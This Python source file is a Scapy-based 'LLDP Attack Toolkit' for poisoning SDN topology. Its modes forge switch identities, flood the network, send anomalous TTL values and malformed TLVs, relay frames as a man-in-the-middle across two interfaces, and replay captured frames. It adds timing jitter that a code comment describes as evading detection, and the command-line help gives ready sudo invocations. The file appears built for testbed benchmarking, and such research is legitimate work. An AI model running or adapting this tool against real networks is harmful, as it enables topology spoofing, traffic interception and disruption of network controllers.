#!/usr/bin/env python3
"""
LLDP Attack Toolkit for SDN Topology Poisoning
Complete attack suite with PCAP export and metadata logging.

Integrates from:
- github.com/Lamonkey/SDN_Topology_Attack (LLDP relay and spoofing)
- github.com/DichHuynh/Topology-Poisoning-Attack-in-SDN (topology poisoning patterns)
- github.com/SySS-Research/WireBug (TLV crafting and malformed packets)
- github.com/profxadke/replay (PCAP replay utility)
- github.com/GoozeyX/python_lldp (LLDP parsing and sniffing)

Enhanced with:
- TokenBucket rate limiting for realistic traffic patterns
- VLAN tagging support (802.1Q)
- Organizational TLV support (vendor-specific)
- Jitter for timing randomization
- Dry-run mode for testing
"""

import argparse
import json
import os
import random
import sys
import threading
import time
from datetime import datetime
from collections import deque

from scapy.all import (
    Ether,
    sendp,
    sniff,
    Raw,
    wrpcap,
    rdpcap,
    Dot1Q,
)

# Scapy LLDP imports - compatible with multiple Scapy versions
try:
    from scapy.layers.l2 import (
        LLDPDU,
        LLDPDUChassisID,
        LLDPDUPortID,
        LLDPDUTimeToLive,
        LLDPDUEndOfLLDPDU,
        LLDPDUSystemName,
        LLDPDUManagementAddress,
    )
except ImportError:
    # Fallback for older Scapy versions
    from scapy.layers.l2 import (
        LLDPDU,
        LLDPDUChassisId as LLDPDUChassisID,
        LLDPDUPortId as LLDPDUPortID,
        LLDPDPTTL as LLDPDUTimeToLive,
        LLDPDUEnd as LLDPDUEndOfLLDPDU,
        LLDPDUSystemName,
    )

# Try importing organizational TLV (may not exist in all versions)
try:
    from scapy.layers.l2 import LLDPDUGenericOrganisationSpecific as LLDPDUOrgSpecific
except ImportError:
    try:
        from scapy.contrib.lldp import LLDPDUGenericOrganisationSpecific as LLDPDUOrgSpecific
    except ImportError:
        LLDPDUOrgSpecific = None


# LLDP CONSTANTS
# From: IEEE 802.1AB
LLDP_MULTICAST = "01:80:c2:00:00:0e"
LLDP_ETHERTYPE = 0x88cc


# ATTACK METADATA TRACKING
# From: Standard practice for testbed logging
class AttackMetadata:
    """Track attack execution metadata for benchmarking."""

    def __init__(self, attack_type, target_interface):
        self.attack_type = attack_type
        self.target_interface = target_interface
        self.start_time = time.time()
        self.end_time = None
        self.packets_sent = 0
        self.packets_captured = 0
        self.parameters = {}
        self.pcap_file = None

    def finish(self):
        """Mark attack as complete."""
        self.end_time = time.time()

    def to_dict(self):
        """Export metadata to dictionary."""
        return {
            "attack_type": self.attack_type,
            "target_interface": self.target_interface,
            "start_time": self.start_time,
            "end_time": self.end_time,
            "duration_sec": self.end_time - self.start_time if self.end_time else 0,
            "packets_sent": self.packets_sent,
            "packets_captured": self.packets_captured,
            "parameters": self.parameters,
            "pcap_file": self.pcap_file
        }

    def save(self, output_file="attack_meta.json"):
        """Save metadata to JSON file."""
        with open(output_file, 'w') as f:
            json.dump(self.to_dict(), f, indent=2)
        print(f"[+] Metadata saved to {output_file}")


class TokenBucket:
    """
    Token bucket rate limiter for realistic traffic patterns.
    Allows burst traffic while maintaining average rate.
    """
    def __init__(self, rate, capacity):
        self.rate = float(rate)
        self.capacity = float(capacity)
        self.tokens = float(capacity)
        self.last = time.monotonic()
        self.lock = threading.Lock()

    def consume(self, tokens=1.0):
        """Attempt to consume tokens. Returns True if successful."""
        with self.lock:
            now = time.monotonic()
            delta = now - self.last
            self.tokens = min(self.capacity, self.tokens + delta * self.rate)
            self.last = now
            if self.tokens >= tokens:
                self.tokens -= tokens
                return True
            return False


# LLDP PACKET CRAFTING
# From: github.com/SySS-Research/WireBug (TLV construction)
def build_lldp(chassis_id: str = "scapy-attacker", port_id: str = "eth0", ttl: int = 120,
               system_name: str = None, org_tlvs: list = None, malformed=False, vlan=None):
    """
    Craft LLDP packet with configurable TLVs.

    Args:
        chassis_id: Chassis identifier (MAC address format or string)
        port_id: Port identifier (string)
        ttl: Time to live in seconds
        system_name: Optional system name TLV
        org_tlvs: List of tuples (oui_bytes, subtype, info_bytes) for vendor-specific TLVs
        malformed: If True, create invalid TLV ordering (violates IEEE 802.1AB)
        vlan: Optional VLAN ID for 802.1Q tagging

    Returns:
        Complete Ethernet frame with LLDP payload
    """
    # Mandatory TLVs - From: IEEE 802.1AB Section 9.2.7
    # Chassis ID TLV - subtype 4 = MAC address
    if isinstance(chassis_id, str):
        chassis_id_bytes = chassis_id.encode() if ':' not in chassis_id else chassis_id.encode()
    else:
        chassis_id_bytes = chassis_id

    chassis = LLDPDUChassisID(subtype=4, id=chassis_id_bytes)

    # Port ID TLV - subtype 7 = Locally assigned, subtype 5 = Interface name
    if isinstance(port_id, str):
        port_id_bytes = port_id.encode()
    else:
        port_id_bytes = port_id

    port = LLDPDUPortID(subtype=7, id=port_id_bytes)

    # TTL TLV
    ttl_tlv = LLDPDUTimeToLive(ttl=ttl)

    # Build TLV list
    tlvs = [chassis, port, ttl_tlv]

    # Optional system name TLV
    if system_name:
        sys_tlv = LLDPDUSystemName(system_name=system_name.encode() if isinstance(system_name, str) else system_name)
        tlvs.append(sys_tlv)

    # Organizational TLVs (vendor-specific)
    if org_tlvs and LLDPDUOrgSpecific:
        for (oui, subtype, info) in org_tlvs:
            tlvs.append(LLDPDUOrgSpecific(oui=oui, subtype=subtype, data=info))

    # Malformed TLV injection - From: github.com/SySS-Research/WireBug
    if malformed:
        # Invalid TLV: type 127 (organizational) with mismatched length
        raw_malformed = b"\x7f\xffBADLEN"
        tlvs.insert(1, Raw(load=raw_malformed))  # Insert at wrong position

    # End TLV (mandatory)
    tlvs.append(LLDPDUEndOfLLDPDU())

    # Construct LLDP packet by chaining TLVs
    pkt = None
    for t in tlvs:
        if pkt is None:
            pkt = t
        else:
            pkt = pkt / t

    # Ethernet header
    eth = Ether(dst=LLDP_MULTICAST, type=LLDP_ETHERTYPE)

    # Optional VLAN tagging (802.1Q)
    if vlan:
        eth = eth / Dot1Q(vlan=int(vlan))

    eth = eth / pkt
    return eth


def send_loop(iface, pkt_builder, tb: TokenBucket, duration, jitter, metadata: AttackMetadata, dry_run=False):
    """
    Send packets in a loop with rate limiting and jitter.

    Args:
        iface: Network interface
        pkt_builder: Callable that returns packet to send
        tb: TokenBucket rate limiter
        duration: Duration in seconds (None = infinite)
        jitter: Maximum random delay in seconds
        metadata: AttackMetadata object to track progress
        dry_run: If True, don't actually send packets

    Returns:
        Tuple of (count, frames)
    """
    start = time.time()
    count = 0
    frames = []

    while True:
        if duration and (time.time() - start) >= duration:
            break

        # Token bucket rate limiting
        while not tb.consume():
            time.sleep(0.001)

        # Jitter for timing randomization (evade pattern detection)
        if jitter and jitter > 0:
            time.sleep(random.uniform(0, jitter))

        pkt = pkt_builder()

        if dry_run:
            frames.append(pkt)
        else:
            sendp(pkt, iface=iface, verbose=False)
            frames.append(pkt)

        count += 1
        metadata.packets_sent += 1

        # Progress indicator
        if count % 100 == 0:
            print(f"    [{count}] packets sent...")

    return count, frames


def sniff_and_relay(in_iface, out_iface, duration=None, tb=None, two_nic=True, metadata=None, dry_run=False):
    """
    LLDP relay attack (MITM).
    From: github.com/Lamonkey/SDN_Topology_Attack (relay attack)

    Two behaviors:
    - two_nic=True: sniff on in_iface, forward on out_iface live
    - two_nic=False: capture then replay (sniff then reinject)

    Args:
        in_iface: Input interface for sniffing
        out_iface: Output interface for forwarding
        duration: Duration in seconds
        tb: TokenBucket rate limiter
        two_nic: True for live relay, False for capture-then-replay
        metadata: AttackMetadata object
        dry_run: If True, capture only without sending

    Returns:
        List of captured/relayed frames
    """
    captured = []
    stop_time = None
    if duration:
        stop_time = time.time() + duration

    def should_stop(pkt):
        return (stop_time is not None and time.time() >= stop_time)

    def pkt_handler(pkt):
        """Callback to relay LLDP packets."""
        # Only forward LLDP frames
        if not hasattr(pkt, 'type') or pkt.type != LLDP_ETHERTYPE:
            return

        # Rate limiting
        if tb and not tb.consume():
            return

        if dry_run:
            captured.append(pkt)
        else:
            sendp(pkt, iface=out_iface, verbose=False)
            captured.append(pkt)

        if metadata:
            metadata.packets_sent += 1

        print(f"    [Relay] Forwarded LLDP packet ({len(captured)} total)")

    # FIXED: Moved outside pkt_handler function
    if two_nic:
        # Live relay: sniff and forward simultaneously
        print(f"    Sniffing LLDP on {in_iface}, forwarding to {out_iface}...")
        sniff(iface=in_iface, prn=pkt_handler, stop_filter=lambda x: should_stop(x))
    else:
        # Capture then replay
        print(f"    Capturing LLDP on {in_iface} for {duration}s...")
        pkts = sniff(iface=in_iface, timeout=duration, filter=f"ether proto 0x{LLDP_ETHERTYPE:04x}")

        print(f"    Captured {len(pkts)} packets, replaying to {out_iface}...")
        for p in pkts:
            if hasattr(p, 'type') and p.type == LLDP_ETHERTYPE:
                if tb:
                    while not tb.consume():
                        time.sleep(0.001)

                if dry_run:
                    captured.append(p)
                else:
                    sendp(p, iface=out_iface, verbose=False)
                    captured.append(p)

                if metadata:
                    metadata.packets_sent += 1

    return captured


def replay_pcap(iface, pcap_file, tb: TokenBucket, duration=None, loop=False, metadata=None, dry_run=False):
    """
    Replay LLDP packets from PCAP file.
    From: github.com/profxadke/replay (PCAP replay utility)

    Args:
        iface: Network interface
        pcap_file: Path to PCAP file
        tb: TokenBucket rate limiter
        duration: Max duration in seconds
        loop: If True, loop through PCAP repeatedly
        metadata: AttackMetadata object
        dry_run: If True, don't actually send

    Returns:
        Tuple of (count, frames)
    """
    if not os.path.exists(pcap_file):
        print(f"[!] Error: PCAP file not found: {pcap_file}")
        return 0, []

    pkts = rdpcap(pcap_file)
    lldp_pkts = [p for p in pkts if hasattr(p, 'type') and p.type == LLDP_ETHERTYPE]

    if not lldp_pkts:
        print(f"[!] No LLDP packets found in {pcap_file}")
        return 0, []

    print(f"    Found {len(lldp_pkts)} LLDP packets in {pcap_file}")

    start = time.time()
    count = 0
    frames = []
    idx = 0

    while True:
        if duration and (time.time() - start) >= duration:
            break

        p = lldp_pkts[idx % len(lldp_pkts)]

        # Rate limiting
        while not tb.consume():
            time.sleep(0.001)

        if dry_run:
            frames.append(p)
        else:
            sendp(p, iface=iface, verbose=False)
            frames.append(p)

        count += 1
        if metadata:
            metadata.packets_sent += 1

        if count % 50 == 0:
            print(f"    [{count}] packets replayed...")

        idx += 1
        if not loop and idx >= len(lldp_pkts):
            break

    return count, frames


# ATTACK MODE: LLDP CAPTURE
# From: github.com/GoozeyX/python_lldp (LLDP sniffing)
def attack_capture(iface, duration=60, output_pcap="captured.pcap"):
    """
    Capture LLDP packets for later replay.
    Useful for reconnaissance before launching attacks.

    Args:
        iface: Network interface to capture on
        duration: Capture duration in seconds
        output_pcap: Output PCAP filename

    Returns:
        AttackMetadata object
    """
    print(f"[*] LLDP Capture Mode")
    print(f"    Interface: {iface}")
    print(f"    Duration: {duration}s")

    meta = AttackMetadata("capture", iface)
    meta.parameters = {
        "duration_sec": duration
    }

    print(f"    Capturing LLDP packets...")
    captured = sniff(iface=iface, timeout=duration,
                     filter=f"ether proto 0x{LLDP_ETHERTYPE:04x}")

    meta.packets_captured = len(captured)
    meta.finish()

    wrpcap(output_pcap, captured)
    meta.pcap_file = output_pcap
    print(f"[+] Captured {len(captured)} LLDP packets")
    print(f"[+] Saved to {output_pcap}")

    meta.save()
    return meta


def write_artifacts(run_name, frames, start_ts, stop_ts, metadata: AttackMetadata = None):
    """
    Write attack artifacts (PCAP and metadata) to disk.

    Args:
        run_name: Directory name for output files
        frames: List of packets to write
        start_ts: Start timestamp
        stop_ts: Stop timestamp
        metadata: Optional AttackMetadata object for enhanced metadata

    Returns:
        Tuple of (pcap_path, meta_path)
    """
    os.makedirs(run_name, exist_ok=True)
    pcap_path = os.path.join(run_name, "attack.pcap")
    meta_path = os.path.join(run_name, "attack_meta.json")

    if frames:
        wrpcap(pcap_path, frames)

    meta = {
        "start": datetime.utcfromtimestamp(start_ts).isoformat() + "Z",
        "stop": datetime.utcfromtimestamp(stop_ts).isoformat() + "Z",
        "count": len(frames),
    }

    # Merge with AttackMetadata if provided
    if metadata:
        meta.update(metadata.to_dict())

    with open(meta_path, "w") as f:
        json.dump(meta, f, indent=2)

    return pcap_path, meta_path


def parse_tlvs_arg(tlvs_str_list):
    """
    Parse organizational TLV arguments.

    Format: OUI:subtype:hex_data
    Example: "001122:1:deadbeef" becomes (b'\x00\x11\x22', 1, b'\xde\xad\xbe\xef')

    Args:
        tlvs_str_list: List of TLV strings

    Returns:
        List of (oui_bytes, subtype_int, info_bytes) tuples
    """
    out = []
    for item in tlvs_str_list or []:
        try:
            oui, sub, info_hex = item.split(":", 2)
            oui_bytes = bytes.fromhex(oui)
            sub_i = int(sub)
            info = bytes.fromhex(info_hex)
            out.append((oui_bytes, sub_i, info))
        except Exception as e:
            print(f"[!] Failed to parse org TLV '{item}': {e}")
    return out


def cli_main():
    """Main CLI entry point."""
    parser = argparse.ArgumentParser(
        description="LLDP Attack Toolkit - SDN Topology Poisoning & Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack Modes:
  spoof       - Forge chassis/port IDs to spoof switches
  flood       - High-rate LLDP flood with unique chassis IDs
  ttl_anomaly - TTL poisoning (0 = immediate timeout, 65535 = long-lived)
  malformed   - Invalid TLV ordering (violates IEEE 802.1AB)
  relay       - MITM relay between interfaces
  replay      - Replay LLDP from PCAP file
  discovery   - Broadcast discovery with randomized IDs
  capture     - Passive LLDP capture for reconnaissance

Examples:
  # Spoof attack
  sudo python3 scapy_lldp_attacks.py --mode spoof --iface eth0 --chassis "aa:bb:cc:dd:ee:ff" --port "eth1" --rate 10

  # Flood attack
  sudo python3 scapy_lldp_attacks.py --mode flood --iface eth0 --rate 50 --duration 30

  # TTL poisoning
  sudo python3 scapy_lldp_attacks.py --mode ttl_anomaly --iface eth0 --ttl-anom-val 0 --rate 5

  # Malformed TLVs
  sudo python3 scapy_lldp_attacks.py --mode malformed --iface eth0 --malformed --rate 10

  # Relay (MITM)
  sudo python3 scapy_lldp_attacks.py --mode relay --iface eth0 --out-iface eth1 --duration 60

  # Replay from PCAP
  sudo python3 scapy_lldp_attacks.py --mode replay --iface eth0 --pcap-in captured.pcap

  # Capture LLDP
  sudo python3 scapy_lldp_attacks.py --mode capture --iface eth0 --duration 60

Advanced Features:
  --vlan 100           # Tag frames with VLAN ID
  --org "001122:1:deadbeef"  # Add vendor-specific TLV
  --jitter 0.05        # Add timing randomization
  --dry-run            # Test without sending packets
  --burst 100          # Token bucket burst capacity
        """
    )

    parser.add_argument("--iface", required=True, help="Network interface to send/receive on")
    parser.add_argument("--out-iface", help="Output interface for two-NIC relay")
    parser.add_argument("--mode",
                        choices=["spoof", "relay", "flood", "ttl_anomaly", "malformed", "replay", "discovery", "capture"],
                        required=True,
                        help="Attack mode")

    # Rate control
    parser.add_argument("--rate", type=float, default=10.0, help="Packets per second (default: 10)")
    parser.add_argument("--burst", type=int, default=50, help="Token bucket burst capacity (default: 50)")
    parser.add_argument("--jitter", type=float, default=0.01, help="Max jitter in seconds (default: 0.01)")

    # Timing
    parser.add_argument("--duration", type=float, default=10.0, help="Duration in seconds (default: 10)")
    parser.add_argument("--count", type=int, help="Number of packets (overrides duration)")

    # LLDP parameters
    parser.add_argument("--chassis", help="Chassis ID (MAC format or string)")
    parser.add_argument("--port", help="Port ID (string)")
    parser.add_argument("--ttl", type=int, default=120, help="Default TTL value (default: 120)")
    parser.add_argument("--ttl-anom-val", type=int, default=1, help="TTL value for ttl_anomaly mode (default: 1)")
    parser.add_argument("--system-name", help="System name TLV")

    # Advanced features
    parser.add_argument("--org", action="append", help="Organizational TLV in OUI:sub:hex format (e.g., 001122:1:deadbeef)")
    parser.add_argument("--vlan", type=int, help="802.1Q VLAN ID to tag frames")
    parser.add_argument("--malformed", action="store_true", help="Enable malformed TLV injection")

    # PCAP
    parser.add_argument("--pcap-in", help="Input PCAP file for replay mode")
    parser.add_argument("--pcap-out", default="attack.pcap", help="Output PCAP filename (default: attack.pcap)")

    # Testing
    parser.add_argument("--dry-run", action="store_true", help="Test mode - don't actually send packets")

    # Output
    parser.add_argument("--run-name", default="run_" + datetime.utcnow().strftime("%Y%m%dT%H%M%SZ"),
                        help="Output directory name")

    args = parser.parse_args()

    # Print banner
    print(f"\n{'='*60}")
    print(f"LLDP Attack Toolkit")
    print(f"{'='*60}\n")

    # Initialize token bucket rate limiter
    tb = TokenBucket(rate=args.rate, capacity=args.burst)

    # Parse organizational TLVs
    org_tlvs = parse_tlvs_arg(args.org)

    # Initialize metadata tracking
    metadata = AttackMetadata(args.mode, args.iface)

    start_ts = time.time()
    frames = []
    count = 0

    try:
        # SPOOF MODE
        if args.mode == "spoof":
            chassis_id = args.chassis or "spoofed-switch"
            port_id = args.port or "eth0"

            print(f"[*] LLDP Spoofing Attack")
            print(f"    Chassis: {chassis_id}")
            print(f"    Port: {port_id}")
            print(f"    Rate: {args.rate} pps | Duration: {args.duration}s")

            metadata.parameters = {
                "chassis_id": chassis_id,
                "port_id": port_id,
                "ttl": args.ttl,
                "rate_pps": args.rate,
                "vlan": args.vlan
            }

            builder = lambda: build_lldp(
                chassis_id=chassis_id,
                port_id=port_id,
                ttl=args.ttl,
                system_name=args.system_name,
                org_tlvs=org_tlvs,
                vlan=args.vlan
            )
            count, frames = send_loop(args.iface, builder, tb, args.duration, args.jitter, metadata, dry_run=args.dry_run)

        # FLOOD MODE - From: github.com/DichHuynh/Topology-Poisoning-Attack-in-SDN
        elif args.mode == "flood":
            chassis_base = args.chassis or "aa:bb:cc:dd:ee"

            print(f"[*] LLDP Flood Attack")
            print(f"    Chassis base: {chassis_base}")
            print(f"    Rate: {args.rate} pps | Duration: {args.duration}s")

            metadata.parameters = {
                "chassis_base": chassis_base,
                "rate_pps": args.rate,
                "duration": args.duration
            }

            # Generate unique chassis IDs for each packet
            pkt_count = [0]  # Mutable counter for lambda
            def flood_builder():
                chassis_id = f"{chassis_base}:{pkt_count[0]%256:02x}"
                port_id = f"flood_port_{pkt_count[0]}"
                pkt_count[0] += 1
                return build_lldp(chassis_id, port_id, ttl=args.ttl, vlan=args.vlan)

            count, frames = send_loop(args.iface, flood_builder, tb, args.duration, args.jitter, metadata, dry_run=args.dry_run)

        # TTL ANOMALY MODE - From: github.com/SySS-Research/WireBug
        elif args.mode == "ttl_anomaly":
            chassis_id = args.chassis or "ttl-anomaly"
            port_id = args.port or "eth0"

            print(f"[*] LLDP TTL Anomaly Attack")
            print(f"    TTL: {args.ttl_anom_val} | Rate: {args.rate} pps")

            metadata.parameters = {
                "chassis_id": chassis_id,
                "port_id": port_id,
                "malicious_ttl": args.ttl_anom_val,
                "rate_pps": args.rate
            }

            builder = lambda: build_lldp(
                chassis_id=chassis_id,
                port_id=port_id,
                ttl=args.ttl_anom_val,
                system_name=args.system_name,
                org_tlvs=org_tlvs,
                vlan=args.vlan
            )
            count, frames = send_loop(args.iface, builder, tb, args.duration, args.jitter, metadata, dry_run=args.dry_run)

        # MALFORMED MODE - From: github.com/SySS-Research/WireBug
        elif args.mode == "malformed":
            chassis_id = args.chassis or "malformed-switch"
            port_id = args.port or "eth0"

            print(f"[*] LLDP Malformed TLV Attack")
            print(f"    Rate: {args.rate} pps | Duration: {args.duration}s")

            metadata.parameters = {
                "chassis_id": chassis_id,
                "port_id": port_id,
                "malformed": True,
                "rate_pps": args.rate
            }

            builder = lambda: build_lldp(
                chassis_id=chassis_id,
                port_id=port_id,
                ttl=args.ttl,
                system_name=args.system_name,
                org_tlvs=org_tlvs,
                malformed=True,
                vlan=args.vlan
            )
            count, frames = send_loop(args.iface, builder, tb, args.duration, args.jitter, metadata, dry_run=args.dry_run)

        # RELAY MODE - From: github.com/Lamonkey/SDN_Topology_Attack
        elif args.mode == "relay":
            out_iface = args.out_iface or args.iface
            two_nic = bool(args.out_iface)

            print(f"[*] LLDP Relay Attack (MITM)")
            print(f"    Sniff: {args.iface} -> Forward: {out_iface}")
            print(f"    Mode: {'Two-NIC live relay' if two_nic else 'Capture-then-replay'}")
            print(f"    Duration: {args.duration}s")

            metadata.parameters = {
                "sniff_interface": args.iface,
                "forward_interface": out_iface,
                "two_nic_mode": two_nic,
                "duration_sec": args.duration
            }

            captured = sniff_and_relay(
                args.iface,
                out_iface,
                duration=args.duration,
                tb=tb,
                two_nic=two_nic,
                metadata=metadata,
                dry_run=args.dry_run
            )
            frames = captured
            count = len(captured)

        # REPLAY MODE - From: github.com/profxadke/replay
        elif args.mode == "replay":
            if not args.pcap_in:
                print("[!] Error: --pcap-in is required for replay mode")
                sys.exit(1)

            print(f"[*] LLDP Replay Attack")
            print(f"    PCAP: {args.pcap_in}")
            print(f"    Rate: {args.rate} pps | Duration: {args.duration}s")

            metadata.parameters = {
                "source_pcap": args.pcap_in,
                "rate_pps": args.rate,
                "duration": args.duration
            }

            count, frames = replay_pcap(
                args.iface,
                args.pcap_in,
                tb,
                duration=args.duration,
                loop=False,
                metadata=metadata,
                dry_run=args.dry_run
            )

        # DISCOVERY MODE
        elif args.mode == "discovery":
            print(f"[*] LLDP Discovery Mode")
            print(f"    Rate: {args.rate} pps | Duration: {args.duration}s")

            metadata.parameters = {
                "mode": "discovery",
                "rate_pps": args.rate,
                "duration": args.duration
            }

            # Broadcast-style: vary chassis/port to discover neighbors
            builder = lambda: build_lldp(
                chassis_id=f"disc-{random.randint(1,9999)}",
                port_id=f"p{random.randint(1,65535)}",
                ttl=args.ttl,
                system_name=args.system_name,
                org_tlvs=org_tlvs,
                vlan=args.vlan
            )
            count, frames = send_loop(args.iface, builder, tb, args.duration, args.jitter, metadata, dry_run=args.dry_run)

        # CAPTURE MODE - From: github.com/GoozeyX/python_lldp
        elif args.mode == "capture":
            metadata = attack_capture(args.iface, args.duration, args.pcap_out)
            print(f"\n[+] Attack completed successfully")
            return 0

        # FINISH AND WRITE ARTIFACTS
        stop_ts = time.time()
        metadata.finish()

        print(f"\n[+] Attack completed")
        print(f"    Packets sent: {count}")
        print(f"    Duration: {stop_ts - start_ts:.2f}s")

        # Write artifacts
        if frames:
            pcap_path, meta_path = write_artifacts(args.run_name, frames, start_ts, stop_ts, metadata)
            print(f"[+] Saved {len(frames)} frames to {pcap_path}")
            print(f"[+] Metadata saved to {meta_path}")

        return 0

    except KeyboardInterrupt:
        print(f"\n[!] Attack interrupted by user")
        stop_ts = time.time()
        metadata.finish()

        # Write artifacts even on interrupt
        if frames:
            pcap_path, meta_path = write_artifacts(args.run_name, frames, start_ts, stop_ts, metadata)
            print(f"[+] Saved {len(frames)} frames to {pcap_path}")
            print(f"[+] Metadata saved to {meta_path}")

        return 1

    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()
        return 1


if __name__ == "__main__":
    sys.exit(cli_main())
